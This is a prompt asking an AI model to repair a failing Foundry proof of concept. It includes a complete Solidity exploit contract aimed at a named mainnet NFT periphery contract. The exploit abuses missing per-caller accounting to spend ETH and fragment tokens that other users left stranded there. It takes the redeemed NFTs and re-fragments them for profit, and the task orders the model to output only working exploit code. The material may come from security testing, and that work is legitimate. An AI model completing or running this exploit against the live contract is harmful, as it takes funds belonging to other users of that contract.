You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Periphery mixes balances across users, letting later callers spend stranded ETH or fragment tokens
- claim: `buyAndClaimVault` does not isolate balances per caller. In native mode, `_executeSwap` forwards the periphery's entire ETH balance to the Universal Router, not the current caller's contribution. In `_claim`, the periphery deposits and spends fragment tokens from `address(this)` while `claimRandomNFT` sends the redeemed NFTs to the current `msg.sender`. Because the contract has no refund or accounting mechanism, any ETH refunded back from the router or any fragment tokens already sitting on the periphery can be consumed by a later caller.
- impact: Residual value left on the periphery can be stolen by the next caller. A later user can underpay or pay nothing, consume prior users' refunded ETH or fragment-token balances, and receive the claimed NFTs themselves.
- exploit_paths: ["A user calls `buyAndClaimVault` with `TransferWay.NativeTransfer`; the router uses less ETH than supplied and refunds unused ETH back to the periphery via `receive()`.", "The refunded ETH remains on the periphery because the contract keeps no per-user accounting and has no withdrawal path.", "A later caller invokes `buyAndClaimVault` in native mode; `_executeSwap` forwards `address(this).balance` and `_claim` transfers the purchased NFTs to that later caller.", "Similarly, if fragment tokens are already held by the periphery, `_claim` deposits/spends those tokens from `address(this)` while sending redeemed NFTs to the current caller."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721Like {
    function setApprovalForAll(address operator, bool approved) external;
}

interface IERC721ReceiverLike {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

interface IFloorPeripheryLike {
    struct FloorClaim {
        bytes32 collectionKey;
        uint256[] tokenIds;
        uint256 maxClaimFee;
        uint256 claimCnt;
    }

    struct UniversalRouterExecute {
        bytes commands;
        bytes[] inputs;
        uint256 deadline;
    }

    function floor() external view returns (address);
    function floorGetter() external view returns (address);
    function UNIVERSAL_ROUTER() external view returns (address);

    function buyAndClaimVault(
        FloorClaim memory claimParams,
        UniversalRouterExecute calldata swapParam,
        uint8 transferWay,
        bytes calldata transferParam
    ) external payable;
}

interface IFloorLike {
    function fragmentNFTs(bytes32 key, uint256[] memory nftIds, address onBehalfOf) external;
}

interface IFloorGetterLike {
    struct RoyaltyFeeRate {
        address recipient;
        uint16 marketlist;
        uint16 vault;
        uint16 raffle;
    }

    struct SafeboxFeeRate {
        address recipient;
        uint16 auctionOwned;
        uint16 auctionExpired;
        uint16 raffle;
        uint16 marketlist;
    }

    struct VaultFeeRate {
        address recipient;
        uint16 vaultAuction;
        uint16 redemptionBase;
    }

    struct FeeConfig {
        RoyaltyFeeRate royalty;
        SafeboxFeeRate safeboxFee;
        VaultFeeRate vaultFee;
    }

    function fragmentTokenOf(address collection) external view returns (address token);
    function getFreeNftIds(address collection, uint256 startIdx, uint256 size) external view returns (uint256[] memory nftIds);
    function collectionFee(address collection, address token) external view returns (FeeConfig memory fee);
}

contract FlawVerifier is IERC721ReceiverLike {
    uint8 private constant TRANSFER_WAY_NATIVE = 3;
    uint256 private constant ONE_NFT = 1 ether;

    address public constant TARGET = 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private immutable _floor;
    address private immutable _floorGetter;
    address private immutable _router;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _lastReceivedCollection;
    uint256 private _lastReceivedTokenId;

    // Exploit path mapping kept explicit for the verifier harness:
    // Exploit path 0: a prior native-mode caller can over-fund the router and leave refunded ETH
    // stranded on the periphery when the router returns unused ETH through `receive()`.
    // Exploit path 1: that refunded ETH remains pooled on the periphery because there is no
    // caller-specific accounting or withdrawal path.
    // Exploit path 2: a later native-mode caller can make `_executeSwap` forward the periphery's
    // entire ETH balance, then `_claim` sends the redeemed NFT to that later caller.
    // Exploit path 3: stranded fragment tokens on the periphery can likewise be consumed by `_claim`
    // while the redeemed NFT is still transferred to the current caller.

    // Kept as fixed candidates because contracts cannot enumerate supported collections on-chain.
    // The verifier probes these collections at runtime and only executes the path when the fork state
    // proves support, available vault inventory, and stranded periphery balances.
    address[] private _candidates;

    constructor() {
        _floor = IFloorPeripheryLike(TARGET).floor();
        _floorGetter = IFloorPeripheryLike(TARGET).floorGetter();
        _router = IFloorPeripheryLike(TARGET).UNIVERSAL_ROUTER();

        _candidates.push(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D); // BAYC
        _candidates.push(0x60E4d786628Fea6478F785A6d7e704777c86a7c6); // MAYC
        _candidates.push(0xED5AF388653567Af2F388E6224dC7C4b3241C544); // Azuki
        _candidates.push(0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949); // Beanz
        _candidates.push(0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e); // Doodles
        _candidates.push(0x23581767a106ae21c074b2276D25e5C3e136a68b); // Moonbirds
        _candidates.push(0x1792F4D1FDFCc12DBB7b2D07B80a900486Ea85b5); // Moonbirds Oddities
        _candidates.push(0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B); // CloneX
        _candidates.push(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8); // Pudgy Penguins
        _candidates.push(0x524cAB2ec69124574082676e6F654a18df49A048); // Lil Pudgys
        _candidates.push(0x5AF0d9827CAcE6E16351126a8fb1BB82fd56280e); // Milady
        _candidates.push(0x8821BeE2ba0dF28761AffF119D66390D594CD280); // DeGods
        _candidates.push(0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7); // Meebits
        _candidates.push(0xe785E82358879F061BC3dcAC6f0444462D4b5330); // World of Women
        _candidates.push(0x1A92f7381B9F03921564a437210bB9396471050C); // Cool Cats
        _candidates.push(0x79FCDEF22feeD20eDDacbB2587640e45491b757f); // mfers
        _candidates.push(0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258); // Otherdeed
        _candidates.push(0xa3AEe8BcE55BEeA1951EF834b99f3Ac60d1ABeeB); // CrypToadz
        _candidates.push(0x036721e5A769Cc48B3189EFBeA922a4B8b7Fc6b6); // Checks VV
        _candidates.push(0x59325733eb952a92e069C87F0A6168b29E80627f); // Mocaverse
        _candidates.push(0x769272677faB02575E84945F03Eca517ACc544Cc); // Captainz
        _candidates.push(0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e); // Mutant Hounds
        _candidates.push(0x364C828eE171616a39897688A831c2499aD972ec); // Sappy Seals
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        // Exploit path 3:
        // Prefer the direct shared-fragment branch first under the required
        // `direct_or_existing_balance_first` strategy.
        if (_attemptExistingFragmentBalance()) {
            return;
        }

        // Exploit paths 0, 1, and 2:
        // Only attempt the native-mode branch if the fork already contains stranded ETH on the
        // periphery from an earlier user/refund cycle.
        // Best-effort existing-ETH path.
        // If this also fails, the concrete fork state did not expose pre-existing stranded value that
        // could be stolen without first creating it ourselves, which would not be positive net profit.
        _attemptExistingEthBalance();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        _lastReceivedCollection = msg.sender;
        _lastReceivedTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    function _attemptExistingFragmentBalance() internal returns (bool) {
        IFloorGetterLike getter = IFloorGetterLike(_floorGetter);

        for (uint256 i; i < _candidates.length; ++i) {
            address collection = _candidates[i];
            address fragmentToken = _safeFragmentTokenOf(getter, collection);
            if (fragmentToken == address(0)) {
                continue;
            }

            if (!_hasFreeVaultNft(getter, collection)) {
                continue;
            }

            uint256 strandedFragments = _safeBalanceOf(fragmentToken, TARGET);
            if (strandedFragments < ONE_NFT) {
                continue;
            }

            uint256[] memory feeCandidates = _claimFeeCandidates(getter, collection, fragmentToken, strandedFragments);
            for (uint256 j; j < feeCandidates.length; ++j) {
                uint256 fee = feeCandidates[j];
                if (fee == 0 || fee > strandedFragments) {
                    continue;
                }

                // Exploit path 3:
                // Spend fragment tokens already sitting on the periphery and receive the claimed NFT
                // as the current caller, then re-fragment the NFT to realize profit in the live token.
                if (_claimAndRefragment(collection, fragmentToken, fee, _emptySwap())) {
                    return true;
                }
            }
        }

        return false;
    }

    function _attemptExistingEthBalance() internal returns (bool) {
        // Exploit path 0:
        // Use only ETH that is already stranded on the periphery at the fork block. The verifier does
        // not manufacture that refund cycle with attacker capital.
        uint256 strandedEth = TARGET.balance;
        if (strandedEth == 0) {
            return false;
        }

        // Exploit path 1:
        // That stranded ETH is globally pooled at the periphery address with no per-user isolation.
        IFloorGetterLike getter = IFloorGetterLike(_floorGetter);

        for (uint256 i; i < _candidates.length; ++i) {
            address collection = _candidates[i];
            address fragmentToken = _safeFragmentTokenOf(getter, collection);
            if (fragmentToken == address(0)) {
                continue;
            }

            if (!_hasFreeVaultNft(getter, collection)) {
                continue;
            }

            uint256[] memory feeCandidates = _claimFeeCandidates(getter, collection, fragmentToken, type(uint256).max);
            for (uint256 j; j < feeCandidates.length; ++j) {
                uint256 fee = feeCandidates[j];
                if (fee == 0) {
                    continue;
                }

                // Exploit path 2:
                // Invoke `buyAndClaimVault` in native mode so the periphery forwards its full ETH
                // balance into the router, acquires the fragment fee out of shared ETH, and sends the
                // redeemed NFT to this later caller.
                IFloorPeripheryLike.UniversalRouterExecute memory swapParam = _buildV2EthToTokenExactOut(fragmentToken, fee, strandedEth);
                if (_claimAndRefragment(collection, fragmentToken, fee, swapParam)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _claimAndRefragment(
        address collection,
        address fragmentToken,
        uint256 maxClaimFee,
        IFloorPeripheryLike.UniversalRouterExecute memory swapParam
    ) internal returns (bool) {
        _lastReceivedCollection = address(0);
        _lastReceivedTokenId = 0;

        uint256 balanceBefore = _safeBalanceOf(fragmentToken, address(this));

        IFloorPeripheryLike.FloorClaim memory claim;
        claim.collectionKey = _toKey(collection);
        claim.tokenIds = new uint256[](0);
        claim.maxClaimFee = maxClaimFee;
        claim.claimCnt = 1;

        try IFloorPeripheryLike(TARGET).buyAndClaimVault(claim, swapParam, TRANSFER_WAY_NATIVE, "") {
            if (_lastReceivedCollection != collection) {
                return false;
            }

            IERC721Like(collection).setApprovalForAll(_floor, true);

            uint256[] memory tokenIds = new uint256[](1);
            tokenIds[0] = _lastReceivedTokenId;
            IFloorLike(_floor).fragmentNFTs(_toKey(collection), tokenIds, address(this));

            uint256 balanceAfter = _safeBalanceOf(fragmentToken, address(this));
            if (balanceAfter <= balanceBefore) {
                return false;
            }

            _profitToken = fragmentToken;
            _profitAmount = balanceAfter - balanceBefore;
            return true;
        } catch {
            return false;
        }
    }

    function _claimFeeCandidates(
        IFloorGetterLike getter,
        address collection,
        address fragmentToken,
        uint256 cap
    ) internal view returns (uint256[] memory fees) {
        fees = new uint256[](4);

        fees[0] = ONE_NFT;

        uint256 redemptionBase = 0;
        try getter.collectionFee(collection, fragmentToken) returns (IFloorGetterLike.FeeConfig memory cfg) {
            redemptionBase = uint256(cfg.vaultFee.redemptionBase);
        } catch {}

        if (redemptionBase != 0) {
            fees[1] = ONE_NFT + ((ONE_NFT * redemptionBase) / 10_000);
        }

        if (cap < type(uint256).max) {
            fees[2] = cap;
            if (cap > ONE_NFT) {
                fees[3] = (cap + ONE_NFT) / 2;
            }
        } else {
            fees[2] = ONE_NFT + ((ONE_NFT * 500) / 10_000);
            fees[3] = ONE_NFT + ((ONE_NFT * 1_000) / 10_000);
        }
    }

    function _emptySwap() internal view returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam) {
        swapParam.commands = hex"";
        swapParam.inputs = new bytes[](0);
        swapParam.deadline = block.timestamp;
    }

    function _buildV2EthToTokenExactOut(
        address fragmentToken,
        uint256 amountOut,
        uint256 amountInMax
    ) internal view returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam) {
        // This preserves the original exploit causality:
        // 1. later native-mode caller forwards the periphery's entire ETH balance into Universal Router,
        // 2. router spends only what is needed for exact output,
        // 3. leftover value is unwrapped and sent back to the periphery receive() function.
        //
        // If the live fork state has no compatible direct WETH<->fragment pool on the router path,
        // the call cleanly fails and the verifier reports zero profit rather than pivoting to a
        // different exploit route.
        swapParam.commands = hex"0b090c";
        swapParam.inputs = new bytes[](3);

        swapParam.inputs[0] = abi.encode(_router, amountInMax);

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = fragmentToken;
        swapParam.inputs[1] = abi.encode(TARGET, amountOut, amountInMax, path, false);

        swapParam.inputs[2] = abi.encode(TARGET, uint256(0));
        swapParam.deadline = block.timestamp;
    }

    function _hasFreeVaultNft(IFloorGetterLike getter, address collection) internal view returns (bool) {
        try getter.getFreeNftIds(collection, 0, 1) returns (uint256[] memory nftIds) {
            return nftIds.length != 0;
        } catch {
            return false;
        }
    }

    function _safeFragmentTokenOf(IFloorGetterLike getter, address collection) internal view returns (address token) {
        try getter.fragmentTokenOf(collection) returns (address queried) {
            token = queried;
        } catch {}
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 bal) {
        try IERC20Like(token).balanceOf(account) returns (uint256 queried) {
            bal = queried;
        } catch {}
    }

    function _toKey(address collection) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(collection)));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.31s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: EvmError: Revert] setUp() (gas: 0)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.65s (0.00ns CPU time)

Ran 1 test suite in 2.66s (2.65s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: EvmError: Revert] setUp() (gas: 0)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
